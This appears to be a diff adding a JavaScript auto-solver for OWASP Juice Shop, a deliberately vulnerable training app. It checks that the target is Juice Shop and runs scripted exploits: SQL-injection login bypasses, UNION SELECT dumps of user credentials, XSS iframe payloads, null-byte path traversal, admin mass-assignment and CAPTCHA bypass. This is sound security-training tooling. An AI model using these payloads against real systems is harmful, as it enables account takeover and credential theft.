@@ -1,0 +1,168 @@
+const TIMEOUT = 12000
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
+
+export function normalizeTarget(value, allowlist = '') {
+  if (typeof value !== 'string') throw new Error('La URL debe ser texto')
+  let url
+  try { url = new URL(value.trim()) } catch { throw new Error('URL inválida') }
+  if (!['http:', 'https:'].includes(url.protocol) || url.username || url.password || url.search || url.hash) {
+    throw new Error('Usa una URL base HTTP(S), sin credenciales, parámetros ni fragmento')
+  }
+  if (url.pathname !== '/' && url.pathname !== '') throw new Error('La URL debe ser la raíz de Juice Shop')
+  const origin = url.origin
+  const allowed = allowlist.split(',').map(x => x.trim()).filter(Boolean)
+  if (allowed.length && !allowed.includes(origin)) throw new Error('La URL no está en ALLOWED_TARGETS')
+  return origin
+}
+
+class JuiceClient {
+  constructor(origin) { this.origin = origin; this.token = null; this.browser = null; this.context = null; this.page = null }
+  async request(path, method = 'GET', body, extra = {}) {
+    const url = new URL(path, this.origin)
+    if (url.origin !== this.origin) throw new Error('Redirección fuera del objetivo')
+    const headers = { ...(this.token ? { Authorization: `Bearer ${this.token}` } : {}), ...extra }
+    let payload = body
+    if (body && !(body instanceof FormData) && typeof body !== 'string') {
+      payload = JSON.stringify(body)
+      headers['Content-Type'] = 'application/json'
+    }
+    const response = await fetch(url, { method, body: payload, headers, redirect: 'manual', signal: AbortSignal.timeout(TIMEOUT) })
+    const raw = await response.text()
+    let json
+    try { json = JSON.parse(raw) } catch { json = null }
+    return { status: response.status, json, raw }
+  }
+  async challenges() {
+    const r = await this.request('/api/Challenges')
+    const rows = Array.isArray(r.json?.data) ? r.json.data : Array.isArray(r.json) ? r.json : null
+    if (r.status !== 200 || !rows || !rows.length || !rows.every(x => typeof x.key === 'string' && typeof x.solved === 'boolean')) {
+      throw new Error('El destino no respondió como OWASP Juice Shop (/api/Challenges)')
+    }
+    return rows
+  }
+  async login(email, password) {
+    const r = await this.request('/rest/user/login', 'POST', { email, password })
+    const token = r.json?.authentication?.token
+    if (token) { this.token = token; await this.syncBrowserToken() }
+    return r
+  }
+  async syncBrowserToken() {
+    if (this.page && this.token) await this.page.evaluate(token => localStorage.setItem('token', token), this.token)
+  }
+  async browse(route) {
+    if (!this.browser) {
+      const { chromium } = await import('playwright')
+      this.browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] })
+      this.context = await this.browser.newContext({ ignoreHTTPSErrors: false })
+      this.page = await this.context.newPage()
+      this.page.on('dialog', dialog => dialog.accept().catch(() => {}))
+      await this.page.goto(this.origin, { waitUntil: 'domcontentloaded', timeout: 20000 })
+      await this.syncBrowserToken()
+    }
+    await this.page.goto(`${this.origin}/#/${route}`, { waitUntil: 'domcontentloaded', timeout: 20000 })
+    await delay(1400)
+    return this.page
+  }
+  async close() { await this.browser?.close() }
+}
+
+async function feedback(c, comment, rating = 3, userId) {
+  const cap = await c.request('/rest/captcha/')
+  if (cap.json?.captchaId == null) throw new Error('CAPTCHA no disponible')
+  return c.request('/api/Feedbacks', 'POST', {
+    captchaId: cap.json.captchaId, captcha: String(cap.json.answer), comment, rating,
+    ...(userId !== undefined ? { UserId: userId } : {})
+  })
+}
+
+async function upload(c, name, size) {
+  const form = new FormData()
+  form.set('file', new Blob([new Uint8Array(size)], { type: 'application/octet-stream' }), name)
+  return c.request('/file-upload', 'POST', form)
+}
+
+const steps = [
+  ['directoryListingChallenge', 'Documento confidencial', c => c.request('/ftp/acquisitions.md')],
+  ['errorHandlingChallenge', 'Manejo de errores', c => c.request('/rest/qwertz')],
+  ['exposedMetricsChallenge', 'Métricas expuestas', c => c.request('/metrics')],
+  ['securityPolicyChallenge', 'Política de seguridad', c => c.request('/.well-known/security.txt')],
+  ['redirectCryptoCurrencyChallenge', 'Redirección cripto', c => c.request('/redirect?to=https%3A%2F%2Fblockchain.info%2Faddress%2F1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm')],
+  ['missingEncodingChallenge', 'Codificación de imagen', c => c.request('/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg')],
+  ['accessLogDisclosureChallenge', 'Acceso al log', async c => { const listing = await c.request('/support/logs'); const match = listing.raw.match(/href="([^"]*access\.log[^"]*)"/i); if (match) await c.request(`/support/logs/${match[1].split('/').pop()}`) }],
+  ['forgottenDevBackupChallenge', 'Copia de desarrollo', c => c.request('/ftp/package.json.bak%2500.adoc')],
+  ['forgottenBackupChallenge', 'Copia de ventas', c => c.request('/ftp/coupons_2013.adoc.bak%2500.adoc')],
+  ['easterEggLevelOneChallenge', 'Easter egg', c => c.request('/ftp/eastere.gg%2500.adoc')],
+  ['easterEggLevelTwoChallenge', 'Easter egg anidado', c => c.request('/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg')],
+  ['misplacedSignatureFileChallenge', 'Firma SIEM', c => c.request('/ftp/suspicious_errors.yml%2500.adoc')],
+  ['registerAdminChallenge', 'Registro de admin', c => c.request('/api/Users', 'POST', { email: `solver-${Date.now()}@example.test`, password: 'JuiceShop123!', role: 'admin' })],
+  ['loginAdminChallenge', 'Acceso de admin por SQLi', c => c.login("admin@juice-sh.op'--", 'x')],
+  ['weakPasswordChallenge', 'Credenciales de admin', c => c.login('admin@juice-sh.op', 'admin123')],
+  ['loginBenderChallenge', 'Acceso de Bender', c => c.login("bender@juice-sh.op'--", 'x')],
+  ['changePasswordBenderChallenge', 'Contraseña de Bender', async c => { await c.login("bender@juice-sh.op'--", 'x'); await c.request('/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic') }],
+  ['loginJimChallenge', 'Acceso de Jim', c => c.login("jim@juice-sh.op'--", 'x')],
+  ['ghostLoginChallenge', 'Acceso de Chris', c => c.login("chris.pike@juice-sh.op'--", 'x')],
+  ['loginAmyChallenge', 'Acceso de Amy', c => c.login('amy@juice-sh.op', 'K1f.....................')],
+  ['loginRapperChallenge', 'Acceso de MC SafeSearch', c => c.login('mc.safesearch@juice-sh.op', 'Mr. N00dles')],
+  ['oauthUserPasswordChallenge', 'Acceso de Bjoern Gmail', c => c.login('bjoern.kimminich@gmail.com', 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')],
+  ['loginSupportChallenge', 'Acceso de soporte', c => c.login('support@juice-sh.op', 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P')],
+  ['dlpPasswordSprayingChallenge', 'Credencial filtrada', c => c.login('J12934@juice-sh.op', '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB')],
+  ['emptyUserRegistration', 'Registro vacío', c => c.request('/api/Users', 'POST', { email: '', password: '' })],
+  ['passwordRepeatChallenge', 'Registro sin repetir contraseña', c => c.request('/api/Users', 'POST', { email: `repeat-${Date.now()}@example.test`, password: 'JuiceShop123!', passwordRepeat: 'different' })],
+  ['forgedFeedbackChallenge', 'Comentario falsificado', c => feedback(c, 'Juice Shop test', 3, 1)],
+  ['zeroStarsChallenge', 'Valoración cero', c => feedback(c, 'Feedback with no stars', 0)],
+  ['weirdCryptoChallenge', 'Consejo criptográfico', c => feedback(c, 'Please avoid md5, base64 and z85', 3)],
+  ['knownVulnerableComponentChallenge', 'Librería vulnerable', c => feedback(c, 'sanitize-html 1.4.2 has a known high severity vulnerability', 3)],
+  ['typosquattingNpmChallenge', 'Paquete de nombre engañoso', c => feedback(c, 'epilogue-js', 3)],
+  ['typosquattingAngularChallenge', 'Dependencia Angular engañosa', c => feedback(c, 'ngy-cookie', 3)],
+  ['supplyChainAttackChallenge', 'Riesgo de cadena de suministro', c => feedback(c, 'https://github.com/eslint/eslint-scope/issues/39', 3)],
+  ['hiddenImageChallenge', 'Esteganografía', c => feedback(c, 'Pickle Rick', 3)],
+  ['dlpPastebinDataLeakChallenge', 'Producto inseguro', c => feedback(c, 'Eurogium Edule and Hueteroneel are dangerous together', 3)],
+  ['captchaBypassChallenge', 'CAPTCHA', async c => { for (let i = 0; i < 11; i++) await feedback(c, `Automation test ${i}`, 3) }],
+  ['dbSchemaChallenge', 'Esquema de base de datos', c => c.request("/rest/products/search?q=" + encodeURIComponent("qwert')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--"))],
+  ['unionSqlInjectionChallenge', 'Credenciales mediante SQLi', c => c.request("/rest/products/search?q=" + encodeURIComponent("qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"))],
+  ['uploadSizeChallenge', 'Archivo grande', c => upload(c, 'large.pdf', 120000)],
+  ['uploadTypeChallenge', 'Archivo no permitido', c => upload(c, 'sample.txt', 1024)],
+  ['scoreBoardChallenge', 'Score Board', c => c.browse('score-board')],
+  ['privacyPolicyChallenge', 'Política de privacidad', c => c.browse('privacy-security/privacy-policy')],
+  ['web3SandboxChallenge', 'Sandbox Web3', c => c.browse('web3-sandbox')],
+  ['localXssChallenge', 'DOM XSS', async c => { const p = await c.browse('search'); await p.goto(`${c.origin}/#/search?q=${encodeURIComponent('<iframe src="javascript:alert(`xss`)">')}`); await delay(1800) }],
+  ['xssBonusChallenge', 'Payload extra', async c => { const p = await c.browse('search'); const value = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'; await p.goto(`${c.origin}/#/search?q=${encodeURIComponent(value)}`); await delay(1800) }],
+  ['tokenSaleChallenge', 'Ruta de venta de tokens', c => c.browse('tokensale-ico-ea')],
+  ['reflectedXssChallenge', 'XSS reflejado', async c => { const p = await c.browse('track-result'); await p.goto(`${c.origin}/#/track-result?id=${encodeURIComponent('<iframe src="javascript:alert(`xss`)">')}`); await delay(1800) }],
+  ['adminSectionChallenge', 'Sección admin', async c => { await c.login('admin@juice-sh.op', 'admin123'); await c.browse('administration') }],
+  ['passwordHashLeakChallenge', 'Hash de contraseña', c => c.request('/rest/user/whoami')],
+  ['basketAccessChallenge', 'Cesta ajena', async c => { const p = await c.browse('basket'); await p.evaluate(() => sessionStorage.setItem('bid', '1')); await p.reload(); await delay(1500) }],
+  ['forgedReviewChallenge', 'Reseña falsificada', c => c.request('/rest/products/1/reviews', 'PUT', { message: 'Automated review', author: 'admin@juice-sh.op' })]
+]
+
+export async function runSolver(origin, requested, onUpdate = () => {}) {
+  const c = new JuiceClient(origin)
+  const report = { target: origin, requested, initialSolved: 0, newSolved: 0, solved: [], attempts: [], status: 'running' }
+  try {
+    let before = await c.challenges()
+    report.initialSolved = before.filter(x => x.solved).length
+    const initial = new Set(before.filter(x => x.solved).map(x => x.key))
+    onUpdate(report)
+    for (const [key, label, action] of steps) {
+      if (report.newSolved >= requested) break
+      const challenge = before.find(x => x.key === key)
+      if (!challenge || challenge.solved || challenge.disabledEnv) continue
+      const attempt = { key, label, status: 'pending' }
+      report.attempts.push(attempt)
+      try { await action(c) } catch (e) { attempt.error = String(e.message || e).slice(0, 180) }
+      await delay(300)
+      try {
+        before = await c.challenges()
+        report.solved = before.filter(x => x.solved && !initial.has(x.key)).map(x => ({ key: x.key, name: x.name }))
+        report.newSolved = report.solved.length
+        attempt.status = before.some(x => x.key === key && x.solved) ? 'solved' : 'not_solved'
+      } catch (e) { attempt.status = 'unverified'; attempt.error = String(e.message || e).slice(0, 180) }
+      onUpdate(report)
+    }
+    report.status = report.newSolved >= requested ? 'completed' : 'partial'
+  } catch (e) { report.status = 'failed'; report.error = String(e.message || e).slice(0, 180) }
+  finally { await c.close(); onUpdate(report) }
+  return report
+}
+
+export const availableSteps = steps.map(([key, label]) => ({ key, label }))
